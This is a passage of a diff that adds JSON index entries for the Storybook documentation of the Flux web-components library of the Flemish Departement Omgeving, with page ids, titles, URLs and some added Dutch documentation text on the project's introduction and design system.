+            "id": "components-atom-paragraph--documentatie",
+            "title": "Components - Atom/paragraph",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-atom-paragraph--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-atom-paragraph-style--documentatie",
+            "title": "Components - Atom/paragraph-style (intern)",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-atom-paragraph-style--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-atom-text--documentatie",
+            "title": "Components - Atom/text",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-atom-text--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-atom-title--documentatie",
+            "title": "Components - Atom/title",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-atom-title--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-block-accordion--documentatie",
+            "title": "Components - Block/accordion",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-block-accordion--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-block-alert--documentatie",
+            "title": "Components - Block/alert",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-block-alert--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-block-autocomplete--documentatie",
+            "title": "Components - Block/autocomplete",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-block-autocomplete--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-block-breadcrumb--documentatie",
+            "title": "Components - Block/breadcrumb",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-block-breadcrumb--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-block-cascader-cascader--documentatie",
+            "title": "Components - Block/cascader/cascader",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-block-cascader-cascader--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-block-cascader-cascader-item--documentatie",
+            "title": "Components - Block/cascader/cascader-item",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-block-cascader-cascader-item--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-block-contact-card--documentatie",
+            "title": "Components - Block/contact-card",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-block-contact-card--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-block-content-header--documentatie",
+            "title": "Components - Block/content-header",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-block-content-header--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-block-description-data-description-data--documentatie",
+            "title": "Components - Block/description-data/description-data",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-block-description-data-description-data--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-block-description-data-description-data-item--documentatie",
+            "title": "Components - Block/description-data/description-data-item",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-block-description-data-description-data-item--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-block-document--documentatie",
+            "title": "Components - Block/document",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-block-document--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-block-doormat--documentatie",
+            "title": "Components - Block/doormat",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-block-doormat--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-block-functional-header--documentatie",
+            "title": "Components - Block/functional-header",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-block-functional-header--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-block-http-error-message--documentatie",
+            "title": "Components - Block/http-error-message",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-block-http-error-message--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-block-info-tile--documentatie",
+            "title": "Components - Block/info-tile",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-block-info-tile--documentatie",
+            "added": "### Verticaal vullend"
+          },
+          {
+            "id": "components-block-infoblock--documentatie",
+            "title": "Components - Block/infoblock",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-block-infoblock--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-block-infotext--documentatie",
+            "title": "Components - Block/infotext",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-block-infotext--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-block-input-slider--documentatie",
+            "title": "Components - Block/input-slider",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-block-input-slider--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-block-loader--documentatie",
+            "title": "Components - Block/loader",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-block-loader--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-block-modal--documentatie",
+            "title": "Components - Block/modal",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-block-modal--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-block-pager--documentatie",
+            "title": "Components - Block/pager",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-block-pager--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-block-pill-pill--documentatie",
+            "title": "Components - Block/pill/pill",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-block-pill-pill--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-block-popover--documentatie",
+            "title": "Components - Block/popover",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-block-popover--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-block-progress-indicator--documentatie",
+            "title": "Components - Block/progress-indicator",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-block-progress-indicator--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-block-properties--documentatie",
+            "title": "Components - Block/properties",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-block-properties--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-block-proza-message--documentatie",
+            "title": "Components - Block/proza-message",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-block-proza-message--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-block-proza-message-preloader--documentatie",
+            "title": "Components - Block/proza-message-preloader",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-block-proza-message-preloader--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-block-rich-data--documentatie",
+            "title": "Components - Block/rich-data",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-block-rich-data--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-block-rich-data-table--documentatie",
+            "title": "Components - Block/rich-data-table",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-block-rich-data-table--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-block-search--documentatie",
+            "title": "Components - Block/search",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-block-search--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-block-search-filter--documentatie",
+            "title": "Components - Block/search-filter",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-block-search-filter--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-block-search-result--documentatie",
+            "title": "Components - Block/search-result",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-block-search-result--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-block-share-buttons-button--documentatie",
+            "title": "Components - Block/share-buttons/button",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-block-share-buttons-button--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-block-share-buttons-buttons--documentatie",
+            "title": "Components - Block/share-buttons/buttons",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-block-share-buttons-buttons--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-block-side-navigation--documentatie",
+            "title": "Components - Block/side-navigation",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-block-side-navigation--documentatie",
+            "added": "Plaats naast het `VlSideNavigationToggle` component een lijst element (`<ul>`) met daaronder `VlSideNavigationItem`\n\n[…]\n\nGebruik geen `VlSideNavigationToggle` component indien er geen subnavigatie is. Een gewone link (`<a href=\"#\">`)\n\n[…]\n\nIndien er geen gebruik gemaakt wordt van hash-routing en de url hash op geen enkele andere manier gemanipuleerd wordt,\n\n[…]\n\n- Indien er een hash aanwezig is in de url die overeenkomt met een element op de pagina dan zal de browser automatisch\n\n[…]\n\nAls de side-navigation gerenderd wordt in een parent component die `hidden` is, bijvoorbeeld bij verschillende stappen\nin een flow, dan gaat de initialisatie fout en zal de side-navigation niet sticky worden bij het scrollen. Dit komt\nomdat de side-navigation bij het initialiseren een aantal dimensies capteerd en, in het geval dat er een parent\n`hidden` is, één van de waardes op 0 komt te staan. Dit kan vermeden worden door het gebruik van `hidden` te vervangen\n\n[…]\n\n        when(this.__stap === 'stap-1', () =>"
+          },
+          {
+            "id": "components-block-side-sheet--documentatie",
+            "title": "Components - Block/side-sheet",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-block-side-sheet--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-block-spotlight--documentatie",
+            "title": "Components - Block/spotlight",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-block-spotlight--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-block-steps-step--documentatie",
+            "title": "Components - Block/steps/step",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-block-steps-step--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-block-steps-steps--documentatie",
+            "title": "Components - Block/steps/steps",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-block-steps-steps--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-block-table--documentatie",
+            "title": "Components - Block/table",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-block-table--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-block-tabs-tabs--documentatie",
+            "title": "Components - Block/tabs/tabs",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-block-tabs-tabs--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-block-tabs-tabs-pane--documentatie",
+            "title": "Components - Block/tabs/tabs-pane",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-block-tabs-tabs-pane--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-block-template--documentatie",
+            "title": "Components - Block/template",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-block-template--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-block-toaster--documentatie",
+            "title": "Components - Block/toaster",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-block-toaster--documentatie",
+            "added": "{`"
+          },
+          {
+            "id": "components-block-typography--documentatie",
+            "title": "Components - Block/typography",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-block-typography--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-block-video-player--documentatie",
+            "title": "Components - Block/video-player",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-block-video-player--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-block-wizard-wizard--documentatie",
+            "title": "Components - Block/wizard/wizard",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-block-wizard-wizard--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-block-wizard-wizard-pane--documentatie",
+            "title": "Components - Block/wizard/wizard-pane",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-block-wizard-wizard-pane--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-compliance-accessibility--documentatie",
+            "title": "Components - Compliance/accessibility",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-compliance-accessibility--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-compliance-cookie-consent--documentatie",
+            "title": "Components - Compliance/cookie-consent",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-compliance-cookie-consent--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-compliance-cookie-statement--documentatie",
+            "title": "Components - Compliance/cookie-statement",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-compliance-cookie-statement--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-compliance-footer--documentatie",
+            "title": "Components - Compliance/footer",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-compliance-footer--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-compliance-footer-next--documentatie",
+            "title": "Components - Compliance/next/footer",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-compliance-footer-next--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-compliance-header--documentatie",
+            "title": "Components - Compliance/header",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-compliance-header--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-compliance-header-next--documentatie",
+            "title": "Components - Compliance/next/header",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-compliance-header-next--documentatie",
+            "added": ">\n\n[…]\n\n>\n\n[…]\n\n>\n>"
+          },
+          {
+            "id": "components-compliance-privacy--documentatie",
+            "title": "Components - Compliance/privacy",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-compliance-privacy--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-form-checkbox--documentatie",
+            "title": "Components - Form/checkbox",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-form-checkbox--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-form-datepicker--documentatie",
+            "title": "Components - Form/datepicker",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-form-datepicker--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-form-form-label--documentatie",
+            "title": "Components - Form/form-label",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-form-form-label--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-form-form-message--documentatie",
+            "title": "Components - Form/form-message",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-form-form-message--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-form-input-field--documentatie",
+            "title": "Components - Form/input-field",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-form-input-field--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-form-input-field-masked--documentatie",
+            "title": "Components - Form/input-field-masked",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-form-input-field-masked--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-form-input-group--documentatie",
+            "title": "Components - Form/input-group",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-form-input-group--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-form-radio-group--documentatie",
+            "title": "Components - Form/radio-group",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-form-radio-group--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-form-select--documentatie",
+            "title": "Components - Form/select",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-form-select--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-form-select-rich--documentatie",
+            "title": "Components - Form/select-rich",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-form-select-rich--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-form-textarea--documentatie",
+            "title": "Components - Form/textarea",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-form-textarea--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-form-textarea-rich--documentatie",
+            "title": "Components - Form/textarea-rich",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-form-textarea-rich--documentatie",
+            "added": null
+          },
+          {
+            "id": "components-form-upload--documentatie",
+            "title": "Components - Form/upload",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/components-form-upload--documentatie",
+            "added": null
+          },
+          {
+            "id": "design-system--documentatie",
+            "title": "Design System",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/design-system--documentatie",
+            "added": "# Design System\n\n## Inhoudstafel\n\n- [Doel](#doel)\n- [Wat is een Design System](#wat-is-een-design-system)\n- [Wat doet Flux (niet)](#wat-doet-flux-niet)\n\n## Doel\n\nMet de 'flux-web-componenten' en deze bijhorende documentatie streven we er naar meer te zijn dan een verzameling\ncomponenten. Het doel is een design system aan te bieden.\n\n\n## Wat is een Design System\n\nEen uitgebreide uitleg over wat een design system is vind je in deze 2 artikels:\n[The Design System Ecosystem](https://bradfrost.com/blog/post/the-design-system-ecosystem/) en\n[Design Systems are for user interfaces](https://bradfrost.com/blog/post/design-systems-are-for-user-interfaces/).\n\nEen **design system** is een **structureel geheel** dat aangeboden wordt om web-toepassingen te bouwen met een\n**uniforme** en **gebruiksvriendelijke interface**. Het is een systeem dat uit sub-systemen bestaat, in ons geval:\n\n- de verschillende componenten - zitten in de [artifacts](/docs/afnemen-artifacts--documentatie) die we aanbieden\n- een font - voorzien door DV, wordt in de componenten gebruikt\n- iconen - zitten in het [Icon Font](/docs/beheren-icon-font--documentatie) van DV; afneembaar via\n  [`<vl-icon>`](/docs/components-atom-icon--documentatie)\n- een kleuren palet - wordt in de componenten gebruikt, wordt nog niet expliciet aangeboden\n- een layout / grid opzet - wordt via het styles artifact aangeboden\n- documentatie van het geheel - deze Storybook documentatie\n- een set van leidraden - de pagina's te vinden ander RICHTLIJNEN, RECEPTEN en ONTWERP\n- goede voorbeelden - de stories en code snippets (via de 'Show code'-knoppen)\n\n\n## Wat doet Flux (niet)\n\nDe focus van het Flux-team ligt op het **uitwerken** en **ondersteunen** van dit **design system**. Het doel is dat\nontwikkelteams m.b.v. de aangeboden bouwblokken frontend toepassingen kunnen bouwen. Het feitelijk bouwen van\ntoepassingen is de verantwoordelijkheid van de ontwikkelteams. Flux kan begeleiden en zal ondersteunen waar nodig."
+          },
+          {
+            "id": "introductie--documentatie",
+            "title": "Introductie",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/introductie--documentatie",
+            "added": "# Introductie\n\n## Inhoudstafel\n\n- [Project Informatie](#project-informatie)\n- [Evolutie](#evolutie)\n- [Releases](#releases)\n- [Issues](#issues)\n- [Documentatie](#documentatie)\n- [Afnemen van de Componenten](#afnemen-van-de-componenten)\n\n\n## Project Informatie\n\nDit is de [Storybook](https://storybook.js.org/) documentatie van het __Flux-team__ (UI & UX) van\n[Departement Omgeving](https://omgeving.vlaanderen.be/), onderdeel van de\n[Vlaamse Overheid](https://www.vlaanderen.be/).\n\nDeze documentatie bevat informatie mbt de [web-components](https://developer.mozilla.org/en-US/docs/Web/Web_Components)\nbibliotheek ontwikkeld en onderhouden door het __Flux-team__. Deze web-componenten bouwen verder op het\n[Webuniversum v3](https://overheid.vlaanderen.be/webuniversum/v3/) van\n[Digitaal Vlaanderen](https://www.vlaanderen.be/digitaal-vlaanderen) (onderdeel van de VO).\nHier - in Storybook - worden de individuele web-componenten beschreven a.d.h.v. Storybook-stories, daarnaast is er\nalgemene informatie m.b.t. afname en ontwikkeling van die componenten.\n\nDe broncode zit verspreid over meerdere [repositories](/docs/beheren-repositories--documentatie) waarvan de repo\n[flux-web-components](https://github.com/milieuinfo/flux-web-components) de belangrijkste is; die bevat de\nfeitelijke web-componenten code.\n\n\n## Evolutie\n\nDeze web-componenten bibliotheek wordt actief ontwikkeld, we doen dit op 3 manieren:\n\n- **support** geven voor de bestaande componenten inclusief het doorvoeren van **bugfixes** en **verbeteringen**\n- **consistentie verbeteringen** door legacy code stelselmatig weg te werken - op een backwards compatibele manier\n- de introductie van **nieuwe / verbeterde componenten**, in de vorm van\n  ['-next' componenten](/docs/planning-aanpak-v2-2024-v3-2025--documentatie#waarom-componenten)\n\nAls afnemer kan je volgen waar we mee bezig zijn en waar we naar toe gaan door:\n\n- het **'flux-development' kanaal** (in Rocket.Chat) te volgen, dit is een must, daarin worden o.a. nieuwe releases\n  aangekondigd\n- de [changelog](/docs/changelog--documentatie) pagina te bekijken - door onze release opzet m.b.v\n  [semantic-release](https://github.com/semantic-release/semantic-release) is deze altijd in-sync met de feitelijke\n  releases\n- de pagina's onder PLANNING te bekijken, begin met [Historiek & Toekomst](/docs/planning-historiek-toekomst--documentatie)\n  en bekijk de pagina's die er naast staan voor meer detail\n- ons [Flux Jira-bord](https://www.milieuinfo.be/jira/secure/RapidBoard.jspa?rapidView=980&view=planning&issueLimit=100#)\n  te volgen, daarin zie je wat er op korte termijn (3 weken sprints) aankomt\n\nVoor verduidelijkingen of toelichtingen kan je ons contacteren via Rocket.Chat.\n\n\n## Releases\n\nOntwikkeling gebeurt met de [Scrum](https://en.wikipedia.org/wiki/Scrum_(software_development)) aanpak waarbij er in\nsprints van 3 weken gewerkt wordt. Ruwweg na elke sprint is er een\n[release](https://github.com/milieuinfo/flux-web-components/releases). De [changelog](/docs/changelog--documentatie) bevat\nhet overzicht van nieuwe features en bugfixes.\n\n\n## Issues\n\nDe [backlog](https://www.milieuinfo.be/jira/secure/RapidBoard.jspa?rapidView=980&view=planning&issueLimit=100#) wordt\nstelselmatig weggewerkt. Gelieve problemen eerst te melden in het `flux-development kanaal` van\n`Rocket.Chat - Departement Omgeving`, nadien kan dan eventueel een nieuw Jira ticket aangemaakt worden voor\n`flux - web-components`.\n\n\n## Documentatie\n\nBij elke release wordt deze Storybook documentatie uitgebreid en aangepast. De meest recente versie kan je\nbookmarken via de url:\n- voor de v1 versie: [https://flux.omgeving.vlaanderen.be/release-v1/latest/storybook](https://flux.omgeving.vlaanderen.be/release-v1/latest/storybook)\n- voor de v2 versie: [https://flux.omgeving.vlaanderen.be/release-v2/latest/storybook](https://flux.omgeving.vlaanderen.be/release-v2/latest/storybook)\n\nSpecifieke release versies zijn te vinden via de release overzicht pagina's van [v1](https://flux.omgeving.vlaanderen.be/release-v1/)\nof [v2](https://flux.omgeving.vlaanderen.be/release-v2/).\n\n\n## Afnemen van de Componenten\n\nGa naar de [Aan De Slag](/docs/afnemen-aan-de-slag--documentatie) pagina voor verdere informatie m.b.t. het gebruik van de\nweb-componenten."
+          },
+          {
+            "id": "map-action-click-action--documentatie",
+            "title": "map/action/click-action",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/map-action-click-action--documentatie",
+            "added": null
+          },
+          {
+            "id": "map-action-draw-action-draw-action-style--documentatie",
+            "title": "map/action/draw-action/draw-action-style",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/map-action-draw-action-draw-action-style--documentatie",
+            "added": null
+          },
+          {
+            "id": "map-action-draw-action-draw-line-action--documentatie",
+            "title": "map/action/draw-action/draw-line-action",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/map-action-draw-action-draw-line-action--documentatie",
+            "added": null
+          },
+          {
+            "id": "map-action-draw-action-draw-point-action--documentatie",
+            "title": "map/action/draw-action/draw-point-action",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/map-action-draw-action-draw-point-action--documentatie",
+            "added": null
+          },
+          {
+            "id": "map-action-draw-action-draw-polygon-action--documentatie",
+            "title": "map/action/draw-action/draw-polygon-action",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/map-action-draw-action-draw-polygon-action--documentatie",
+            "added": null
+          },
+          {
+            "id": "map-action-draw-action-measure-action--documentatie",
+            "title": "map/action/draw-action/measure-action",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/map-action-draw-action-measure-action--documentatie",
+            "added": null
+          },
+          {
+            "id": "map-action-layer-action-delete-action--documentatie",
+            "title": "map/action/layer-action/delete-action",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/map-action-layer-action-delete-action--documentatie",
+            "added": null
+          },
+          {
+            "id": "map-action-layer-action-modify-action--documentatie",
+            "title": "map/action/layer-action/modify-action",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/map-action-layer-action-modify-action--documentatie",
+            "added": null
+          },
+          {
+            "id": "map-action-layer-action-select-action--documentatie",
+            "title": "map/action/layer-action/select-action",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/map-action-layer-action-select-action--documentatie",
+            "added": null
+          },
+          {
+            "id": "map-action-layer-action-select-action-multiselect-actions--documentatie",
+            "title": "map/action/layer-action/select-action/multiselect-actions",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/map-action-layer-action-select-action-multiselect-actions--documentatie",
+            "added": null
+          },
+          {
+            "id": "map-action-layer-action-select-action-select-actions--documentatie",
+            "title": "map/action/layer-action/select-action/select-actions",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/map-action-layer-action-select-action-select-actions--documentatie",
+            "added": null
+          },
+          {
+            "id": "map-baselayer--documentatie",
+            "title": "map/baselayer",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/map-baselayer--documentatie",
+            "added": null
+          },
+          {
+            "id": "map-baselayer-baselayer-grb--documentatie",
+            "title": "map/baselayer/baselayer-grb",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/map-baselayer-baselayer-grb--documentatie",
+            "added": null
+          },
+          {
+            "id": "map-baselayer-baselayer-grb-gray--documentatie",
+            "title": "map/baselayer/baselayer-grb-gray",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/map-baselayer-baselayer-grb-gray--documentatie",
+            "added": null
+          },
+          {
+            "id": "map-baselayer-baselayer-grb-ortho--documentatie",
+            "title": "map/baselayer/baselayer-grb-ortho",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/map-baselayer-baselayer-grb-ortho--documentatie",
+            "added": null
+          },
+          {
+            "id": "map-controls-action-control--documentatie",
+            "title": "map/controls/action-control",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/map-controls-action-control--documentatie",
+            "added": null
+          },
+          {
+            "id": "map-controls-action-controls--documentatie",
+            "title": "map/controls/action-controls",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/map-controls-action-controls--documentatie",
+            "added": null
+          },
+          {
+            "id": "map-controls-measure-control--documentatie",
+            "title": "map/controls/measure-control",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/map-controls-measure-control--documentatie",
+            "added": null
+          },
+          {
+            "id": "map-current-location--documentatie",
+            "title": "map/current-location",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/map-current-location--documentatie",
+            "added": null
+          },
+          {
+            "id": "map-layer-style--documentatie",
+            "title": "map/layer-style",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/map-layer-style--documentatie",
+            "added": null
+          },
+          {
+            "id": "map-layer-style-layer-circle-style--documentatie",
+            "title": "map/layer-style/layer-circle-style",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/map-layer-style-layer-circle-style--documentatie",
+            "added": null
+          },
+          {
+            "id": "map-layer-switcher--documentatie",
+            "title": "map/layer-switcher",
